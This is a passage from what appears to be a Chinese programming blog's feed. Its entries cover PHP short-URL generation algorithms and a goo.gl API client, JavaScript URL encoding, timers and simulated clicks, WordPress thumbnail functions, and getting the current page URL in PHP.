$_SERVER[‘HTTP_X_REWRITE_URL’] 来替换 $_SERVER[‘REQUEST_URI’]<br>暂时世界清静了。<br>要提取完整的重写后的URL地址，还没这么简单，需要考虑子目录下重写的情况，下回放出完整的无bug的提取重写url的函数，依靠此函数，将函数分割，然后形成$controller, $action .. 等参数</p>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>微博短网址生成算法原理 by cubeking</title>
      <link href="/2012/12/18/php/%E5%BE%AE%E5%8D%9A%E7%9F%AD%E7%BD%91%E5%9D%80%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%20by%20cubeking/"/>
      <url>/2012/12/18/php/%E5%BE%AE%E5%8D%9A%E7%9F%AD%E7%BD%91%E5%9D%80%E7%94%9F%E6%88%90%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%20by%20cubeking/</url>
      
        <content type="html"><![CDATA[<p><strong>   <a href="http://baike.baidu.com/view/2693499.htm" target="_blank">短网址</a>（Short URL），顾名思义就是在形式上比较短的网址。通常用的是asp或者php转向，在Web 2.0的今天，不得不说，这是一个潮流。目前已经有许多类似服务，借助短网址您可以用简短的网址替代原来冗长的网址，让使用者可以更容易的分享链接。</strong></p><p><strong>例如：<a href="http://t.cn/SzjPjA" target="_blank" rel="noopener">http://t.cn/SzjPjA</a>  表示<a href="http://hi.baidu.com/cubeking/" target="_blank" rel="noopener">http://hi.baidu.com/cubeking/</a></strong></p><p>短网址服务，可能很多朋友都已经不再陌生，现在大部分微博、手机邮件提醒等地方已经有很多应用模式了，并占据了一定的市场。估计很多朋友现在也正在使用。</p><p>看过新浪的短连接服务，发现后面主要有6个字符串组成，于是第一个想到的就是原来公司写的一个游戏激活码规则，也就是下面的算法2，</p><p>26个大写字母 26小写字母，10个数字，随机生成6个然后插入数据库对应一个id，短连接跳转的时候，根据字符串查询到对应id，即可实现相应的跳转！不过2的62次方，不知道有没有重复的，小概率可以，但是对应不是很大的网站应该足够了</p><p>自从twitter推出短网址(shorturl),继之国内各大微博跟风,google公开goo.gl使用API,短网址之风愈演愈烈.不得不说这是一个新兴又一大热门web2.0服务.现整理一下,包括完整短网址网站,<a href="http://hi.baidu.com/cubeking/blog/item/5e73241e5d75769786d6b658.html" target="_blank"><strong>短网址生成原理</strong></a>,算法举例,以及优劣比较,同时还介绍几个phper个人实现的.</p><p><strong>算法原理<br></strong><strong>算法一<br></strong>1)将长网址md5生成32位签名串,分为4段, 每段8个字节;<br>2)对这四段循环处理, 取8个字节, 将他看成16进制串与0x3fffffff(30位1)与操作, 即超过30位的忽略处理;<br>3)这30位分成6段, 每5位的数字作为字母表的索引取得特定字符, 依次进行获得6位字符串;<br>4)总的md5串可以获得4个6位串; 取里面的任意一个就可作为这个长url的短url地址;</p><p>这种算法,虽然会生成4个,但是仍然存在重复几率,下面的算法一和三,就是这种的实现.</p><p><strong>算法二<br></strong>a-zA-Z0-9 这64位取6位组合,可产生500多亿个组合数量.把数字和字符组合做一定的映射,就可以产生唯一的字符串,如第62个组合就是aaaaa9,第63个组合就是aaaaba,再利用洗牌算法，把原字符串打乱后保存，那么对应位置的组合字符串就会是无序的组合。<br>把长网址存入数据库,取返回的id,找出对应的字符串,例如返回ID为1，那么对应上面的字符串组合就是bbb,同理 ID为2时，字符串组合为bba,依次类推,直至到达64种组合后才会出现重复的可能，所以如果用上面的62个字符，任意取6个字符组合成字符串的话，你的数据存量达到500多亿后才会出现重复的可能。<br>具体参看这里彻底完善新浪微博接口和超短URL算法,算法四可以算作是此算法的一种实现,此算法一般不会重复,但是如果是统计的话,就有很大问题,特别是对域名相关的统计,就抓瞎了.</p><p><strong>简单生成短网址方法</strong></p><p><strong>&lt;?php</strong></p><p>02function <strong>base62</strong>($x)03{04    $show= ‘’;05    while($x&gt; 0) {06        $s= $x% 62;07        if($s&gt; 35) {08            $s= chr($s+61);            09        } elseif($s&gt; 9 &amp;&amp; $s&lt;=35) {10            $s= chr($s+ 55);11        }12        $show.= $s;13        $x= floor($x/62);14    }15    return $show;    16}17  18function <strong>urlShort</strong>($url)19{20    $url= crc32($url);21    $result= sprintf(“%u”, $url);22    return base62($result);23}24  25echo <strong>urlShort</strong>(“<a href="http://hi.baidu.com/cubeking/" target="_blank" rel="noopener">http://hi.baidu.com/cubeking/</a>“);<strong>?&gt;</strong><br><a href="http://hi.baidu.com/cubeking/blog/item/5e73241e5d75769786d6b658.html" target="_blank"><strong>短网址算法</strong></a><strong>枚举</strong></p><p>代码如下:<br>&lt;?php<br>function shorturl($input) {<br>$base32 = array (<br>‘a’, ‘b’, ‘c’, ‘d’, ‘e’, ‘f’, ‘g’, ‘h’,<br>‘i’, ‘j’, ‘k’, ‘l’, ‘m’, ‘n’, ‘o’, ‘p’,<br>‘q’, ‘r’, ‘s’, ‘t’, ‘u’, ‘v’, ‘w’, ‘x’,<br>‘y’, ‘z’, ‘0’, ‘1’, ‘2’, ‘3’, ‘4’, ‘5’<br>);</p><p>$hex = md5($input);<br>$hexLen = strlen($hex);<br>$subHexLen = $hexLen / 8;<br>$output = array();</p><p>for ($i = 0; $i &lt; $subHexLen; $i++) {<br>$subHex = substr ($hex, $i * 8, 8);<br>$int = 0x3FFFFFFF &amp; (1 * (‘0x’.$subHex));<br>$out = ‘’;</p><p>for ($j = 0; $j &lt; 6; $j++) {<br>$val = 0x0000001F &amp; $int;<br>$out .= $base32[$val];<br>$int = $int &gt;&gt; 5;<br>}</p><p>$output[] = $out;<br>}</p><p>return $output;<br>}<br>?&gt;</p><p><strong>另一个是纯随机数算法<br></strong>&lt;?php<br>function random($length, $pool = ‘’)<br>{<br>$random = ‘’;</p><p>if (empty($pool)) {<br>$pool    = ‘abcdefghkmnpqrstuvwxyz’;<br>$pool   .= ‘23456789’;<br>}</p><p>srand ((double)microtime()*1000000);</p><p>for($i = 0; $i &lt; $length; $i++)<br>{<br>$random .= substr($pool,(rand()%(strlen ($pool))), 1);<br>}</p><p>return $random;<br>}<br>?&gt;</p><p>各大微博短网址(ShortUrl)的算法 ,第一种算法的C#实现<br>&lt;?php<br>// 这是c#代码,受编辑器的限制,只能用php<br>public static string[] ShortUrl(string url)<br>{<br>//可以自定义生成MD5加密字符传前的混合KEY<br>string key = “Leejor”;<br>//要使用生成URL的字符<br>string[] chars = new string[]{<br>“a”,”b”,”c”,”d”,”e”,”f”,”g”,”h”,<br>“i”,”j”,”k”,”l”,”m”,”n”,”o”,”p”,<br>“q”,”r”,”s”,”t”,”u”,”v”,”w”,”x”,<br>“y”,”z”,”0”,”1”,”2”,”3”,”4”,”5”,<br>“6”,”7”,”8”,”9”,”A”,”B”,”C”,”D”,<br>“E”,”F”,”G”,”H”,”I”,”J”,”K”,”L”,<br>“M”,”N”,”O”,”P”,”Q”,”R”,”S”,”T”,<br>“U”,”V”,”W”,”X”,”Y”,”Z”</p><p>};<br>//对传入网址进行MD5加密<br>string hex = System.Web.Security.FormsAuthentication.HashPasswordForStoringInConfigFile(key + url, “md5”);</p><p>string[] resUrl = new string[4];</p><p>for (int i = 0; i &lt; 4; i++)<br>{<br>//把加密字符按照8位一组16进制与0x3FFFFFFF进行位与运算<br>int hexint = 0x3FFFFFFF &amp; Convert.ToInt32(“0x” + hex.Substring(i * 8, 8), 16);<br>string outChars = string.Empty;<br>for (int j = 0; j &lt; 6; j++)<br>{<br>//把得到的值与0x0000003D进行位与运算，取得字符数组chars索引<br>int index = 0x0000003D &amp; hexint;<br>//把取得的字符相加<br>outChars += chars[index];<br>//每次循环按位右移5位<br>hexint = hexint &gt;&gt; 5;<br>}<br>//把字符串存入对应索引的输出数组<br>resUrl[i] = outChars;<br>}</p><p>return resUrl;<br>}<br>?&gt;</p><p>高进制数字转换,使用六十二进制将十进制数字变“短”。例如数据库中第 56800235583 条信息，对应的短网址后缀可以是 ZZZZZZ 。<br>下面是存储示例：</p><p>&lt;?php<br>//id 自增序列/自增编号<br>//url 目标链接<br>//<em>suffix</em> 短网址后缀 （并不需要存储在数据库内）<br>+————+———————–+———+<br>|id          | url                   | <em>suffix</em>|<br>+————+———————–+———+<br>|123456      | <a href="http://zoeey.com/" target="_blank" rel="noopener">http://zoeey.com/</a>     | w7e     |<br>+————+———————–+———+<br>|123457      | <a href="http://www.zoeey.com/" target="_blank" rel="noopener">http://www.zoeey.com/</a> | w7f     |<br>+————+———————–+———+<br>|56800235582 | <a href="http://zoeey.org/" target="_blank" rel="noopener">http://zoeey.org/</a>     | ZZZZZY  |<br>+————+———————–+———+<br>|56800235583 | <a href="http://www.zoeey.org/" target="_blank" rel="noopener">http://www.zoeey.org/</a> | ZZZZZZ  |<br>+————+———————–+———+<br>?&gt;<br>短网址使用流程：<br>提交网址存储后获取其编号 如：123456<br>用dec2Any将编号转换为62进制，并拼接网址 如：<a href="http://go.to/w7e" target="_blank" rel="noopener">http://go.to/w7e</a><br>用户访问到 <a href="http://go.to/w7e" target="_blank" rel="noopener">http://go.to/w7e</a> 时，提取短网址后缀 w7e<br>用any2Dec将短网址后缀转换为10进制，得到链接编号 如：123456<br>使用编号查询链接，并进行跳转[/list]<br>下面是进制转换所需要的源码：<br>&lt;?php<br>/*</p><ul><li>MoXie (<a href="mailto:SysTem128@GMail.Com" target="_blank" rel="noopener">SysTem128@GMail.Com</a>) 2010-6-30 17:53:57</li><li></li><li>Copyright &amp;copy; 2008-2010 Zoeey.Org . All rights are reserved.</li><li>Code license: Apache License  Version 2.0</li><li><a href="http://www.apache.org/licenses/LICENSE-2.0.txt" target="_blank" rel="noopener">http://www.apache.org/licenses/LICENSE-2.0.txt</a></li><li>/<br>error_reporting(E_ALL);</li></ul><p>/**</p><ul><li>返回一字符串，十进制 number 以 radix 进制的表示。</li><li>@param dec       需要转换的数字</li><li>@param toRadix    输出进制。当不在转换范围内时，此参数会被设定为 2，以便及时发现。</li><li>@return    指定输出进制的数字</li><li>/<br>function dec2Any($dec, $toRadix) {<br>$MIN_RADIX = 2;<br>$MAX_RADIX = 62;<br>$num62 = ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;<br>if ($toRadix &lt; $MIN_RADIX || $toRadix &gt; $MAX_RADIX) {<br>$toRadix = 2;<br>}<br>if ($toRadix == 10) {<br>return $dec;<br>}<br>// -Long.MIN_VALUE 转换为 2 进制时长度为65<br>$buf = array();<br>$charPos = 64;<br>$isNegative = $dec &lt; 0; //(bccomp($dec, 0) &lt; 0);<br>if (!$isNegative) {<br>$dec = -$dec; // bcsub(0, $dec);<br>}</li></ul><p>while (bccomp($dec, -$toRadix) &lt;= 0) {<br>$buf[$charPos–] = $num62[-bcmod($dec, $toRadix)];<br>$dec = bcdiv($dec, $toRadix);<br>}<br>$buf[$charPos] = $num62[-$dec];<br>if ($isNegative) {<br>$buf[–$charPos] = ‘-‘;<br>}<br>$_any = ‘’;<br>for ($i = $charPos; $i &lt; 65; $i++) {<br>$_any .= $buf[$i];<br>}<br>return $_any;<br>}</p><p>/**</p><ul><li>返回一字符串，包含 number 以 10 进制的表示。&lt;br /&gt;</li><li>fromBase 只能在 2 和 62 之间（包括 2 和 62）。</li><li>@param number    输入数字</li><li>@param fromRadix    输入进制</li><li>@return  十进制数字</li><li>/<br>function any2Dec($number, $fromRadix) {<br>$num62 = ‘0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;<br>$dec = 0;<br>$digitValue = 0;<br>$len = strlen($number) - 1;<br>for ($t = 0; $t &lt;= $len; $t++) {<br>$digitValue = strpos($num62, $number[$t]);<br>$dec = bcadd(bcmul($dec, $fromRadix), $digitValue);<br>}<br>return $dec;<br>}</li></ul><p>$sol = ‘&lt;br /&gt;’ . PHP_EOL;<br>echo dec2Any(‘56800235583’, 62), $sol; // ZZZZZZ<br>echo any2Dec(‘ZZZZZZ’, 62), $sol; // 56800235583<br>echo dec2Any(‘123456’, 62), $sol; // w7e<br>echo any2Dec(‘w7e’, 62), $sol; // 123456<br>?&gt;</p><p>另外,介绍一下goo.gl接口api的应用.<br>据说此算法是各种短网址服务中 “……（这是）互联网上最稳定、最安全、最快速的短网址服务。”(google声称)</p><p>有人做了比较，证明确实如此。</p><p>除了速度快，goo.gl还提供详细的点击统计。比如，Yahoo首页的短网址是<a href="http://goo.gl/QuXj，那么它的统计数据就在http://goo.gl/info/QuXj。加上后缀&quot;.qr&quot;，还能得到这个网址的二维条形码，Yahoo的就是http://goo.gl/QuXj.qr。" target="_blank" rel="noopener">http://goo.gl/QuXj，那么它的统计数据就在http://goo.gl/info/QuXj。加上后缀&quot;.qr&quot;，还能得到这个网址的二维条形码，Yahoo的就是http://goo.gl/QuXj.qr。</a></p><p>详细信息可从这查看：<a href="http://code.google.com/apis/urlshortener/overview.html" target="_blank" rel="noopener">http://code.google.com/apis/urlshortener/overview.html</a></p><p>下面是<a href="http://www.biaodianfu.com/php-google-urlshortener-api.html弄的一个简单的PHP调用API生成短网址方法，分享给大家。" target="_blank" rel="noopener">http://www.biaodianfu.com/php-google-urlshortener-api.html弄的一个简单的PHP调用API生成短网址方法，分享给大家。</a><br>在使用前，请先到这里申请API Key：<a href="http://code.google.com/apis/console/" target="_blank" rel="noopener">http://code.google.com/apis/console/</a><br>短网址的生成需要使用POST提交数据，所以使用了curl，短网址的还原可以直接使用file_get_contents()函数。不过为了统一，也使用了curl来处理哈。<br>&lt;?php<br>// 生成<br>function shortenGoogleUrl($long_url){<br>$apiKey = ‘API-KEY’; //Get API key from : <a href="http://code.google.com/apis/console/" target="_blank" rel="noopener">http://code.google.com/apis/console/</a><br>$postData = array(‘longUrl’ =&gt; $long_url, ‘key’ =&gt; $apiKey);<br>$jsonData = json_encode($postData);<br>$curlObj = curl_init();<br>curl_setopt($curlObj, CURLOPT_URL, ‘<a href="https://www.googleapis.com/urlshortener/v1/url&#39;" target="_blank" rel="noopener">https://www.googleapis.com/urlshortener/v1/url&#39;</a>);<br>curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, 1);<br>curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, 0);<br>curl_setopt($curlObj, CURLOPT_HEADER, 0);<br>curl_setopt($curlObj, CURLOPT_HTTPHEADER, array(‘Content-type:application/json’));<br>curl_setopt($curlObj, CURLOPT_POST, 1);<br>curl_setopt($curlObj, CURLOPT_POSTFIELDS, $jsonData);<br>$response = curl_exec($curlObj);<br>curl_close($curlObj);<br>$json = json_decode($response);<br>return $json-&gt;id;<br>}</p><p>//还原<br>function expandGoogleUrl($short_url){<br>$curlObj = curl_init();<br>curl_setopt($curlObj, CURLOPT_URL, ‘<a href="https://www.googleapis.com/urlshortener/v1/url?shortUrl=&#39;.$short_url" target="_blank" rel="noopener">https://www.googleapis.com/urlshortener/v1/url?shortUrl=&#39;.$short_url</a>);<br>curl_setopt($curlObj, CURLOPT_HEADER, 0);<br>curl_setopt($curlObj, CURLOPT_RETURNTRANSFER, 1);<br>curl_setopt($curlObj, CURLOPT_SSL_VERIFYPEER, 0);<br>$response = curl_exec($curlObj);<br>curl_close($curlObj);<br>$json = json_decode($response);<br>return $json-&gt;longUrl;<br>}<br>?&gt;</p><p><strong> PHP SDK</strong></p><ul>    <li>下载地址：http://code.google.com/p/libweibo/</li></ul>（包含新版接口及OAuth2.0，由SAE提供维护，SAE平台已集成最新版PHPSDK）<p>&nbsp;</p><ul>    <li>Demo使用教程</li></ul><ol>    <li>在open.weibo.com创建应用，得到AppKey，设置“授权设置”中的“应用回调页”地址为"http://host/callback.php"，其中host为网站域名。</li>    <li>下载Demo,然后解压,修改config.php中的WB_AKEY为App Key，WB_SKEY为App Secret，WB_CALLBACK_URL为刚才填入的回调页地址。</li>    <li>上传到PHP空间即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>javascript urlencode 推荐 encodeURIComponent</title>
      <link href="/2012/12/18/js/javascript%20urlencode%20%E6%8E%A8%E8%8D%90%20encodeURIComponent/"/>
      <url>/2012/12/18/js/javascript%20urlencode%20%E6%8E%A8%E8%8D%90%20encodeURIComponent/</url>
      
        <content type="html"><![CDATA[<p>网上查到的全都是escape，和需要的编码不是一回事，好不容易找到的结果 保存下来以备以后使用<br>js对文字进行编码涉及3个函数：escape,encodeURI,encodeURIComponent，相应3个解码函数：unescape,decodeURI,decodeURIComponent<br>1、   传递参数时需要使用encodeURIComponent，这样组合的url才不会被#等特殊字符截断。<br>例如：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.write(<span class="string">'&lt;a href="http://passport.baidu.com/?logout&amp;aid=7&amp;u='</span>+<span class="built_in">encodeURIComponent</span>(<span class="string">"http://cang.baidu.com/bruce42"</span>)+<span class="string">'"&gt;退出&lt;/a&gt;'</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>2、   进行url跳转时可以整体使用encodeURI<br>例如：<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">Location.href</span>=<span class="string">"/encodeURI"</span>(<span class="string">"http://cang.baidu.com/do/s?word=百度&amp;ct=21"</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure></p><p>3、   js使用数据时可以使用escape<br>例如：搜藏中history纪录。<br>4、   escape对0-255以外的unicode值进行编码时输出%u****格式，其它情况下escape，encodeURI，encodeURIComponent编码结果相同。<br>最多使用的应为encodeURIComponent，它是将中文、韩文等特殊字符转换成utf-8格式的url编码，所以如果给后台传递参数需要使用encodeURIComponent时需要后台解码对utf-8支持（form中的编码方</p><p>```</p>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>the_post_thumbnail和get_the_post_thumbnail</title>
      <link href="/2012/12/18/php/the_post_thumbnail%E5%92%8Cget_the_post_thumbnail/"/>
      <url>/2012/12/18/php/the_post_thumbnail%E5%92%8Cget_the_post_thumbnail/</url>
      
        <content type="html"><![CDATA[<div>the_post_thumbnail 在 WordPress 中主要用来打印文章中设定的缩略图，而 get_the_post_thumbnail 函数可以将你需要的 HTML 代码以字符串的形式返回。</div><div><strong>the_post_thumbnail</strong> 函数的使用<div>the_post_thumbnail($size,$attr)</div>函数参数$size 是指你想要的缩略图类型 默认是 ‘post-thumbnail’ 也就是特色图像$attr 图像img标签中的属性设置。<p><strong>the_post_thumbnail</strong> 函数声明</p><div>/**  * Display Post Thumbnail.  *  * @since 2.9.0  *  * @param int $size Optional. Image size. Defaults to 'post-thumbnail', which theme sets using set_post_thumbnail_size( $width, $height, $crop_flag );.  * @param string|array $attr Optional. Query string or array of attributes.  */functionthe_post_thumbnail($size='post-thumbnail',$attr=''){echoget_the_post_thumbnail(null,$size,$attr);}</div><strong>get_the_post_thumbnail</strong> 函数声明<div>*Retrieve Post Thumbnail.**@since 2.9.0  **@param int $post_idOptional.Post ID.*@param string $sizeOptional.Image size.Defaults to 'post-thumbnail'.*@param string|array$attrOptional.Query string or arrayof attributes.*/functionget_the_post_thumbnail($post_id=null,$size='post-thumbnail',$attr=''){$post_id=(null===$post_id)? get_the_ID():$post_id;$post_thumbnail_id=get_post_thumbnail_id($post_id);$size=apply_filters('post_thumbnail_size',$size);if($post_thumbnail_id){do_action('begin_fetch_post_thumbnail_html',$post_id,$post_thumbnail_id,$size);// for "Just In Time" filtering of all of wp_get_attachment_image()'s filtersif(in_the_loop())update_post_thumbnail_cache();$html=wp_get_attachment_image($post_thumbnail_id,$size,false,$attr);do_action('end_fetch_post_thumbnail_html',$post_id,$post_thumbnail_id,$size);}else{$html='';}returnapply_filters('post_thumbnail_html',$html,$post_id,$post_thumbnail_id,$size,$attr);}</div></div>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>php获取当前页面的URL</title>
      <link href="/2012/12/16/php/php%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E7%9A%84URL/"/>
      <url>/2012/12/16/php/php%E8%8E%B7%E5%8F%96%E5%BD%93%E5%89%8D%E9%A1%B5%E9%9D%A2%E7%9A%84URL/</url>
      
        <content type="html"><![CDATA[<figure class="highlight"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">function curPageURL() </span><br><span class="line">&#123;</span><br><span class="line">    $pageURL = 'http';</span><br><span class="line"></span><br><span class="line">    if ($_SERVER["HTTPS"] == "on") </span><br><span class="line">    &#123;</span><br><span class="line">        $pageURL .= "s";</span><br><span class="line">    &#125;</span><br><span class="line">    $pageURL .= "://";</span><br><span class="line"></span><br><span class="line">    if ($_SERVER["SERVER_PORT"] != "80") </span><br><span class="line">    &#123;</span><br><span class="line">        $pageURL .= $_SERVER["SERVER_NAME"] . ":" . $_SERVER["SERVER_PORT"] . $_SERVER["REQUEST_URI"];</span><br><span class="line">    &#125; </span><br><span class="line">    else </span><br><span class="line">    &#123;</span><br><span class="line">        $pageURL .= $_SERVER["SERVER_NAME"] . $_SERVER["REQUEST_URI"];</span><br><span class="line">    &#125;</span><br><span class="line">    return $pageURL;</span><br><span class="line">&#125; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>js setInterval与setTimeout(定时执行与循环执行)</title>
      <link href="/2012/12/16/js/Js%20setInterval%E4%B8%8EsetTimeout(%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%BE%AA%E7%8E%AF%E6%89%A7%E8%A1%8C)/"/>
      <url>/2012/12/16/js/Js%20setInterval%E4%B8%8EsetTimeout(%E5%AE%9A%E6%97%B6%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%BE%AA%E7%8E%AF%E6%89%A7%E8%A1%8C)/</url>
      
        <content type="html"><![CDATA[<p>Document自带的方法：<br>循环执行：var timeid = window.setInterval（“方法名或方法”，“延时”）;window.clearInterval(timeid);<br>定时执行：var tmid = window.setTimeout(“方法名或方法”, “延时”);window.clearTimeout(tmid);<br>举例说明： </p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">A.当要执行的方法中不需要参数时 </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”</span>&gt;</span> </span><br><span class="line"><span class="actionscript"><span class="comment">//循环执行，每隔3秒钟执行一次showalert（） </span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.setInterval(showalert, <span class="number">3000</span>); </span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showalert</span><span class="params">()</span> </span></span></span><br><span class="line">&#123; </span><br><span class="line">alert(“aaaaa”); </span><br><span class="line">&#125; </span><br><span class="line"><span class="actionscript"><span class="comment">//定时执行，5秒后执行show() </span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.setTimeout(show,<span class="number">5000</span>); </span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">()</span> </span></span></span><br><span class="line">&#123; </span><br><span class="line">alert(“bbb”); </span><br><span class="line">&#125; </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br><span class="line">B.当要执行的方法中需要参数时 </span><br><span class="line">复制代码代码如下:</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">”text/javascript”</span>&gt;</span> </span><br><span class="line"><span class="actionscript"><span class="comment">//循环执行，每隔3秒钟执行一次 showalert（） </span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.setInterval(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span></span><br><span class="line">showalert(“aaaaa”); </span><br><span class="line">&#125;, 3000); </span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showalert</span><span class="params">(mess)</span> </span></span></span><br><span class="line">&#123; </span><br><span class="line">alert(mess); </span><br><span class="line">&#125; </span><br><span class="line"><span class="actionscript"><span class="comment">//定时执 行，5秒后执行showalert() </span></span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; </span></span><br><span class="line">showalert(“bbbbbb”); </span><br><span class="line">&#125;,5000); </span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> js </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>js模拟点击事件</title>
      <link href="/2012/12/16/js/js%E6%A8%A1%E6%8B%9F%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/"/>
      <url>/2012/12/16/js/js%E6%A8%A1%E6%8B%9F%E7%82%B9%E5%87%BB%E4%BA%8B%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>在实际的应用开发中，我们会常常用到JS的模事件，比如说点击事件，举个简单的例子，点击表单外的“提交”按钮来提交表单。上代码吧。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>请单击“提交”，测试提交按钮的单击事件也被触发了。<span class="tag">&lt;/<span class="name">h3</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span>   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"www.woiweb.net"</span> <span class="attr">readonly</span>/&gt;</span>   <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">"subbtn"</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"先别点击此按钮提交"</span> <span class="attr">onclick</span>=<span class="string">"alert('我已经提交了');"</span>/&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span>   Javscript: <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript">   <span class="keyword">var</span> sub = <span class="built_in">document</span>.getElementById(<span class="string">"subbtn"</span>);   <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>); <span class="comment">//通用方法 btn.onclick = function() &#123; sub.click(); &#125; </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>经过测试，IE，FF，Chrome，Opera，Safari都没有问题，均可正常提交表单。</p><p>但在实际的设计中，为了让提交按钮更好看，buildder经常把它们用a标签来处理，加个背景图片来模拟按钮，我们仍然用上面的思路来尝试，增加一个a标签，让它来提交表单，我们仅修改html。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h3</span>&gt;</span>请单击“提交”，测试提交按钮的单击事件也被触发了。<span class="tag">&lt;/<span class="name">h3</span>&gt;</span> <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">"btn"</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span> <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"#"</span> <span class="attr">method</span>=<span class="string">"get"</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span>   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"site"</span> <span class="attr">value</span>=<span class="string">"www.woiweb.net"</span> <span class="attr">readonly</span>/&gt;</span>   <span class="comment">&lt;!--&lt;input id="subbtn" type="submit" value="先别点击此按钮提交" onclick="alert('我已经提交了');"/&gt; --&gt;</span>   <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">"subbtn"</span> <span class="attr">href</span>=<span class="string">"javascript:;"</span> <span class="attr">onclick</span>=<span class="string">"alert('在此调用提交表单的方法')"</span>&gt;</span>模拟提交按钮<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="tag">&lt;/<span class="name">form</span>&gt;</span>   javascript:   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript">   <span class="keyword">var</span> sub = <span class="built_in">document</span>.getElementById(<span class="string">"subbtn"</span>);   <span class="keyword">var</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">"btn"</span>); <span class="comment">//通用方法 btn.onclick = function() &#123; sub.click(); &#125; 8 </span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>运行后，问题出现了，IE、FF、Opera均OK，但Chrome和Safari不能正常运行，后来网上搜索了下，发现a标签并不是和按钮一样有onclick()事件的，解决办法是针对 IE 和 FF编写不同的逻辑，JS代码如下：</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;   var <span class="function"><span class="keyword">sub</span> = <span class="title">document</span>.<span class="title">getElementById</span></span>("subbtn");   var btn = 